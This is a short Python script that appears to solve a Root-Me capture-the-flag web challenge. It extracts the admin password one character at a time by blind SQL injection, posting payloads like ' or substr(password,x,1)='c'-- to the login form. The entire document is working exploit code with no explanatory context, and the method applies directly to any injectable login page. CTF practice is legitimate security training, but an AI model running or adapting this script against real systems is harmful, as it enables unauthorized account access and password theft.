#!/usr/bin/python
import requests, string

password = ''
headers ={'Host':'challenge01.root-me.org', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5', 'Referer':'http://challenge01.root-me.org/web-serveur/ch10/', 'Connection':'keep-alive', 'Upgrade-Insecure-Requests':'1'}
url = 'http://challenge01.root-me.org/web-serveur/ch10/'


for x in range(1,9):
    for letter in string.printable:
        payload ={'username':'admin', 'password':'%27 or substr(password,' + str(x) + ',1)=%27' + letter + '%27--'}
        result = requests.post(url, data=payload, headers=headers)
        print result.text
        if 'admin' in result.text:
            password += letter
    if len(password) != x:
        password += '_none_'

print password
